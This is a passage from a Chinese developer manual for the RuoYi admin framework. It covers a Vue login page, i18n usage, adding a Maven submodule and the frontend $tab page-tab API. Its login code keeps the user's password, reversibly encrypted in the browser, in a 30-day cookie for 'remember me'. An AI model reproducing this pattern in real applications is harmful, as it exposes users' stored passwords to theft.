        password<span class="token operator">:</span> <span class="token punctuation">[</span>
          <span class="token punctuation">{<!-- --></span> required<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> trigger<span class="token operator">:</span> <span class="token string">"blur"</span><span class="token punctuation">,</span> message<span class="token operator">:</span> <span class="token string">"密码不能为空"</span> <span class="token punctuation">}</span>
        <span class="token punctuation">]</span><span class="token punctuation">,</span>
        code<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">{<!-- --></span> required<span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> trigger<span class="token operator">:</span> <span class="token string">"change"</span><span class="token punctuation">,</span> message<span class="token operator">:</span> <span class="token string">"验证码不能为空"</span> <span class="token punctuation">}</span><span class="token punctuation">]</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      loading<span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
      redirect<span class="token operator">:</span> <span class="token keyword">undefined</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  watch<span class="token operator">:</span> <span class="token punctuation">{<!-- --></span>
    $route<span class="token operator">:</span> <span class="token punctuation">{<!-- --></span>
      <span class="token function-variable function">handler</span><span class="token operator">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">route</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>redirect <span class="token operator">=</span> route<span class="token punctuation">.</span>query <span class="token operator">&amp;&amp;</span> route<span class="token punctuation">.</span>query<span class="token punctuation">.</span>redirect<span class="token punctuation">;</span>
      <span class="token punctuation">}</span><span class="token punctuation">,</span>
      immediate<span class="token operator">:</span> <span class="token boolean">true</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  <span class="token function">created</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getCookie</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">,</span>
  methods<span class="token operator">:</span> <span class="token punctuation">{<!-- --></span>
    <span class="token function">getCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
      <span class="token function">getCodeImg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>codeUrl <span class="token operator">=</span> <span class="token string">"data:image/gif;base64,"</span> <span class="token operator">+</span> res<span class="token punctuation">.</span>img<span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>loginForm<span class="token punctuation">.</span>uuid <span class="token operator">=</span> res<span class="token punctuation">.</span>uuid<span class="token punctuation">;</span>
      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token function">getCookie</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
      <span class="token keyword">const</span> username <span class="token operator">=</span> Cookies<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">const</span> password <span class="token operator">=</span> Cookies<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">const</span> rememberMe <span class="token operator">=</span> Cookies<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'rememberMe'</span><span class="token punctuation">)</span>
      <span class="token keyword">this</span><span class="token punctuation">.</span>loginForm <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
        username<span class="token operator">:</span> username <span class="token operator">===</span> <span class="token keyword">undefined</span> <span class="token operator">?</span> <span class="token keyword">this</span><span class="token punctuation">.</span>loginForm<span class="token punctuation">.</span>username <span class="token operator">:</span> username<span class="token punctuation">,</span>
        password<span class="token operator">:</span> password <span class="token operator">===</span> <span class="token keyword">undefined</span> <span class="token operator">?</span> <span class="token keyword">this</span><span class="token punctuation">.</span>loginForm<span class="token punctuation">.</span>password <span class="token operator">:</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">,</span>
        rememberMe<span class="token operator">:</span> rememberMe <span class="token operator">===</span> <span class="token keyword">undefined</span> <span class="token operator">?</span> <span class="token boolean">false</span> <span class="token operator">:</span> <span class="token function">Boolean</span><span class="token punctuation">(</span>rememberMe<span class="token punctuation">)</span>
      <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token function">handleLogin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
      <span class="token keyword">this</span><span class="token punctuation">.</span>$refs<span class="token punctuation">.</span>loginForm<span class="token punctuation">.</span><span class="token function">validate</span><span class="token punctuation">(</span><span class="token parameter">valid</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>valid<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>loading <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>loginForm<span class="token punctuation">.</span>rememberMe<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            Cookies<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>loginForm<span class="token punctuation">.</span>username<span class="token punctuation">,</span> <span class="token punctuation">{<!-- --></span> expires<span class="token operator">:</span> <span class="token number">30</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            Cookies<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">,</span> <span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>loginForm<span class="token punctuation">.</span>password<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">{<!-- --></span> expires<span class="token operator">:</span> <span class="token number">30</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            Cookies<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'rememberMe'</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>loginForm<span class="token punctuation">.</span>rememberMe<span class="token punctuation">,</span> <span class="token punctuation">{<!-- --></span> expires<span class="token operator">:</span> <span class="token number">30</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
            Cookies<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            Cookies<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            Cookies<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">'rememberMe'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token punctuation">}</span>
          <span class="token keyword">this</span><span class="token punctuation">.</span>$store
            <span class="token punctuation">.</span><span class="token function">dispatch</span><span class="token punctuation">(</span><span class="token string">"Login"</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>loginForm<span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{<!-- --></span>
              <span class="token keyword">this</span><span class="token punctuation">.</span>loading <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
              <span class="token keyword">this</span><span class="token punctuation">.</span>$router<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">{<!-- --></span> path<span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>redirect <span class="token operator">||</span> <span class="token string">"/"</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token punctuation">)</span>
            <span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{<!-- --></span>
              <span class="token keyword">this</span><span class="token punctuation">.</span>loading <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
              <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getCode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
      <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>

<span class="token operator">&lt;</span>style rel<span class="token operator">=</span><span class="token string">"stylesheet/scss"</span> lang<span class="token operator">=</span><span class="token string">"scss"</span><span class="token operator">&gt;</span>
<span class="token punctuation">.</span>login <span class="token punctuation">{<!-- --></span>
  display<span class="token operator">:</span> flex<span class="token punctuation">;</span>
  justify<span class="token operator">-</span>content<span class="token operator">:</span> center<span class="token punctuation">;</span>
  align<span class="token operator">-</span>items<span class="token operator">:</span> center<span class="token punctuation">;</span>
  height<span class="token operator">:</span> <span class="token number">100</span><span class="token operator">%</span><span class="token punctuation">;</span>
  background<span class="token operator">-</span>image<span class="token operator">:</span> <span class="token function">url</span><span class="token punctuation">(</span><span class="token string">"../assets/image/login-background.jpg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  background<span class="token operator">-</span>size<span class="token operator">:</span> cover<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token punctuation">.</span>title <span class="token punctuation">{<!-- --></span>
  margin<span class="token operator">:</span> <span class="token number">0</span>px auto <span class="token number">30</span>px auto<span class="token punctuation">;</span>
  text<span class="token operator">-</span>align<span class="token operator">:</span> center<span class="token punctuation">;</span>
  color<span class="token operator">:</span> #<span class="token number">707070</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token punctuation">.</span>login<span class="token operator">-</span>form <span class="token punctuation">{<!-- --></span>
  border<span class="token operator">-</span>radius<span class="token operator">:</span> <span class="token number">6</span>px<span class="token punctuation">;</span>
  background<span class="token operator">:</span> #ffffff<span class="token punctuation">;</span>
  width<span class="token operator">:</span> <span class="token number">400</span>px<span class="token punctuation">;</span>
  padding<span class="token operator">:</span> <span class="token number">25</span>px <span class="token number">25</span>px <span class="token number">5</span>px <span class="token number">25</span>px<span class="token punctuation">;</span>
  <span class="token punctuation">.</span>el<span class="token operator">-</span>input <span class="token punctuation">{<!-- --></span>
    height<span class="token operator">:</span> <span class="token number">38</span>px<span class="token punctuation">;</span>
    input <span class="token punctuation">{<!-- --></span>
      height<span class="token operator">:</span> <span class="token number">38</span>px<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span>
  <span class="token punctuation">.</span>input<span class="token operator">-</span>icon <span class="token punctuation">{<!-- --></span>
    height<span class="token operator">:</span> <span class="token number">39</span>px<span class="token punctuation">;</span>
    width<span class="token operator">:</span> <span class="token number">14</span>px<span class="token punctuation">;</span>
    margin<span class="token operator">-</span>left<span class="token operator">:</span> <span class="token number">2</span>px<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token punctuation">.</span>login<span class="token operator">-</span>tip <span class="token punctuation">{<!-- --></span>
  font<span class="token operator">-</span>size<span class="token operator">:</span> <span class="token number">13</span>px<span class="token punctuation">;</span>
  text<span class="token operator">-</span>align<span class="token operator">:</span> center<span class="token punctuation">;</span>
  color<span class="token operator">:</span> #bfbfbf<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token punctuation">.</span>login<span class="token operator">-</span>code <span class="token punctuation">{<!-- --></span>
  width<span class="token operator">:</span> <span class="token number">33</span><span class="token operator">%</span><span class="token punctuation">;</span>
  height<span class="token operator">:</span> <span class="token number">38</span>px<span class="token punctuation">;</span>
  float<span class="token operator">:</span> right<span class="token punctuation">;</span>
  img <span class="token punctuation">{<!-- --></span>
    cursor<span class="token operator">:</span> pointer<span class="token punctuation">;</span>
    vertical<span class="token operator">-</span>align<span class="token operator">:</span> middle<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token punctuation">.</span>el<span class="token operator">-</span>login<span class="token operator">-</span>footer <span class="token punctuation">{<!-- --></span>
  height<span class="token operator">:</span> <span class="token number">40</span>px<span class="token punctuation">;</span>
  line<span class="token operator">-</span>height<span class="token operator">:</span> <span class="token number">40</span>px<span class="token punctuation">;</span>
  position<span class="token operator">:</span> fixed<span class="token punctuation">;</span>
  bottom<span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">;</span>
  width<span class="token operator">:</span> <span class="token number">100</span><span class="token operator">%</span><span class="token punctuation">;</span>
  text<span class="token operator">-</span>align<span class="token operator">:</span> center<span class="token punctuation">;</span>
  color<span class="token operator">:</span> #fff<span class="token punctuation">;</span>
  font<span class="token operator">-</span>family<span class="token operator">:</span> Arial<span class="token punctuation">;</span>
  font<span class="token operator">-</span>size<span class="token operator">:</span> <span class="token number">12</span>px<span class="token punctuation">;</span>
  letter<span class="token operator">-</span>spacing<span class="token operator">:</span> <span class="token number">1</span>px<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>style<span class="token operator">&gt;</span>
</code></pre>
<pre><code class="prism language-text">普通文本使用方式： {<!-- -->{ $t('login.title') }}
标签内使用方式：   :placeholder="$t('login.password')"
js内使用方式       this.$t('login.user.password.not.match')
</code></pre>
<h2><a id="_3682"></a>二十一、新建子模块</h2>
<p><code>Maven</code>多模块下新建子模块流程案例。</p>
<p>1、新建业务模块目录，例如：<code>ruoyi-test</code>。</p>
<p>2、在<code>ruoyi-test</code>业务模块下新建<code>pom.xml</code>文件以及<code>src\main\java</code>，<code>src\main\resources</code>目录。</p>
<pre><code class="prism language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>project</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0<span class="token punctuation">"</span></span>
         <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>
         <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>parent</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>ruoyi<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.ruoyi<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>x.x.x<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>parent</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>modelVersion</span><span class="token punctuation">&gt;</span></span>4.0.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>modelVersion</span><span class="token punctuation">&gt;</span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>ruoyi-test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">&gt;</span></span>
        test系统模块
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">&gt;</span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">&gt;</span></span>

        <span class="token comment">&lt;!-- 通用工具--&gt;</span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.ruoyi<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>ruoyi-common<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>

    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">&gt;</span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>project</span><span class="token punctuation">&gt;</span></span>
</code></pre>
<p>3、根目录<code>pom.xml</code>依赖声明节点<code>dependencies</code>中添加依赖</p>
<pre><code class="prism language-xml"><span class="token comment">&lt;!-- 测试模块--&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.ruoyi<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>ruoyi-test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>${ruoyi.version}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
</code></pre>
<p>4、根目录<code>pom.xml</code>模块节点<code>modules</code>添加业务模块</p>
<pre><code class="prism language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>module</span><span class="token punctuation">&gt;</span></span>ruoyi-test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>module</span><span class="token punctuation">&gt;</span></span>
</code></pre>
<p>5、<code>ruoyi-admin</code>目录<code>pom.xml</code>添加模块依赖</p>
<pre><code class="prism language-xml"><span class="token comment">&lt;!-- 测试模块--&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.ruoyi<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>ruoyi-test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
</code></pre>
<p>6、测试模块</p>
<p>在<code>ruoyi-test</code>业务模块添加<code>com.ruoyi.test</code>包，新建<code>TestService.java</code></p>
<pre><code class="prism language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestService</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">helloTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token string">"hello"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>在<code>ruoyi-admin</code>新建测试类，调用<code>helloTest</code>成功返回<code>hello</code>代表成功。</p>
<h2><a id="_3768"></a>二十二、前端手册</h2>
<h2><a id="1_3770"></a>1、通用方法</h2>
<h3><a id="1tab_3772"></a>.1、$tab对象</h3>
<p><code>$tab</code>对象用于做页签操作、刷新页签、关闭页签、打开页签、修改页签等，它定义在<code>plugins/tab.js</code>文件中，它有如下方法</p>
<ul><li>打开页签</li></ul>
<pre><code class="prism language-js"><span class="token keyword">this</span><span class="token punctuation">.</span>$tab<span class="token punctuation">.</span><span class="token function">openPage</span><span class="token punctuation">(</span><span class="token string">"用户管理"</span><span class="token punctuation">,</span> <span class="token string">"/system/user"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">this</span><span class="token punctuation">.</span>$tab<span class="token punctuation">.</span><span class="token function">openPage</span><span class="token punctuation">(</span><span class="token string">"用户管理"</span><span class="token punctuation">,</span> <span class="token string">"/system/user"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{<!-- --></span>
  <span class="token comment">// 执行结束的逻辑</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre>
<ul><li>修改页签</li></ul>
<pre><code class="prism language-js"><span class="token keyword">const</span> obj <span class="token operator">=</span> Object<span class="token punctuation">.</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>$route<span class="token punctuation">,</span> <span class="token punctuation">{<!-- --></span> title<span class="token operator">:</span> <span class="token string">"自定义标题"</span> <span class="token punctuation">}</span><span class="token punctuation">)</span> 
<span class="token keyword">this</span><span class="token punctuation">.</span>$tab<span class="token punctuation">.</span><span class="token function">updatePage</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">this</span><span class="token punctuation">.</span>$tab<span class="token punctuation">.</span><span class="token function">updatePage</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{<!-- --></span>
  <span class="token comment">// 执行结束的逻辑</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre>
<ul><li>关闭页签</li></ul>
<pre><code class="prism language-js"><span class="token comment">// 关闭当前tab页签，打开新页签</span>
<span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span> path<span class="token operator">:</span> <span class="token string">"/system/user"</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>$tab<span class="token punctuation">.</span><span class="token function">closeOpenPage</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 关闭当前页签，回到首页</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>$tab<span class="token punctuation">.</span><span class="token function">closePage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 关闭指定页签</span>
<span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span> path<span class="token operator">:</span> <span class="token string">"/system/user"</span><span class="token punctuation">,</span> name<span class="token operator">:</span> <span class="token string">"User"</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>$tab<span class="token punctuation">.</span><span class="token function">closePage</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">this</span><span class="token punctuation">.</span>$tab<span class="token punctuation">.</span><span class="token function">closePage</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{<!-- --></span>
  <span class="token comment">// 执行结束的逻辑</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre>
<ul><li>刷新页签</li></ul>
<pre><code class="prism language-js"><span class="token comment">// 刷新当前页签</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>$tab<span class="token punctuation">.</span><span class="token function">refreshPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 刷新指定页签</span>
<span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span> path<span class="token operator">:</span> <span class="token string">"/system/user"</span><span class="token punctuation">,</span> name<span class="token operator">:</span> <span class="token string">"User"</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>$tab<span class="token punctuation">.</span><span class="token function">refreshPage</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">this</span><span class="token punctuation">.</span>$tab<span class="token punctuation">.</span><span class="token function">refreshPage</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{<!-- --></span>
  <span class="token comment">// 执行结束的逻辑</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre>
<ul><li>关闭所有页签</li></ul>
<pre><code class="prism language-js"><span class="token keyword">this</span><span class="token punctuation">.</span>$tab<span class="token punctuation">.</span><span class="token function">closeAllPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">this</span><span class="token punctuation">.</span>$tab<span class="token punctuation">.</span><span class="token function">closeAllPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{<!-- --></span>
  <span class="token comment">// 执行结束的逻辑</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre>
<ul><li>关闭左侧页签</li></ul>
<pre><code class="prism language-js"><span class="token keyword">this</span><span class="token punctuation">.</span>$tab<span class="token punctuation">.</span><span class="token function">closeLeftPage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> obj <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span> path<span class="token operator">:</span> <span class="token string">"/system/user"</span><span class="token punctuation">,</span> name<span class="token operator">:</span> <span class="token string">"User"</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token keyword">this</span><span class="token punctuation">.</span>$tab<span class="token punctuation">.</span><span class="token function">closeLeftPage</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">this</span><span class="token punctuation">.</span>$tab<span class="token punctuation">.</span><span class="token function">closeLeftPage</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{<!-- --></span>
  <span class="token comment">// 执行结束的逻辑</span>
<span class="token punctuation">}</span><span class="token punctuation">)</span>
</code></pre>
<ul><li>关闭右侧页签</li></ul>
